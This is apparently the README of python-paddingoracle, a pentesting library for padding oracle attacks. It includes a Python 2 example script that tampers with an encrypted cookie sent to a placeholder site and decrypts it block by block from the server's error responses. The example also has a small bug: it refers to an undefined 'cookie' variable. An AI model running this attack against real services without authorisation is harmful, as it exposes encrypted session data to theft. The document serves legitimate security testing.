python-paddingoracle: A portable, padding oracle exploit API
============================================================

python-paddingoracle is an API that provides pentesters a customizable
alternative to `PadBuster`_ and other padding oracle exploit tools that can't
easily (without a heavy rewrite) be used in unique, per-app scenarios. Think
non-HTTP applications, raw sockets, client applications, unique encodings, etc.

Usage:
------

To use the paddingoracle API, simply implement the **oracle()** method from the
PaddingOracle API and raise a **BadPaddingException** when the decrypter
reveals a padding oracle. To decrypt data, pass raw encrypted bytes as a
`bytearray <http://docs.python.org/2/library/functions.html#bytearray>`_ to 
**decrypt()**.

See below for an example (from `the example`_): ::

    from paddingoracle import BadPaddingException, PaddingOracle
    from base64 import b64encode, b64decode
    from urllib import quote, unquote
    import requests
    import socket
    import time

    class PadBuster(PaddingOracle):
        def __init__(self, **kwargs):
            PaddingOracle.__init__(self, **kwargs)
            self.session = requests.session(prefetch=True, timeout=5, verify=False)

        def oracle(self, data):
            somecookie = quote(b64encode(data))
            self.session.cookies['somecookie'] = somecookie

            while 1:
                try:
                    response = self.session.get('http://www.example.com/')
                    break
                except (socket.error, requests.exceptions.SSLError):
                    time.sleep(2)
                    continue

            self.history.append(response)

            if response.ok:
                logging.debug('No padding exception raised on %r', cookie)
                return

            # An HTTP 500 error was returned, likely due to incorrect padding
            raise BadPaddingException

    if __name__ == '__main__':
        import logging
        import sys

        if not sys.argv[1:]:
            print 'Usage: %s <somecookie value>' % (sys.argv[0], )
            sys.exit(1)

        logging.basicConfig(level=logging.DEBUG)

        encrypted_cookie = b64decode(unquote(sys.argv[1]))

        padbuster = PadBuster()

        cookie = padbuster.decrypt(encrypted_cookie, block_size=8, iv=bytearray(8))

        print('Decrypted somecookie: %s => %r' % (sys.argv[1], cookie))


Credits
-------
python-paddingoracle is a Python implementation heavily based on `PadBuster`_,
an automated script for performing Padding Oracle attacks, developed by
Brian Holyfield of Gotham Digital Science.

.. _`the example`: https://github.com/mwielgoszewski/python-paddingoracle/blob/master/example.py
.. _`PadBuster`: https://github.com/GDSSecurity/PadBuster

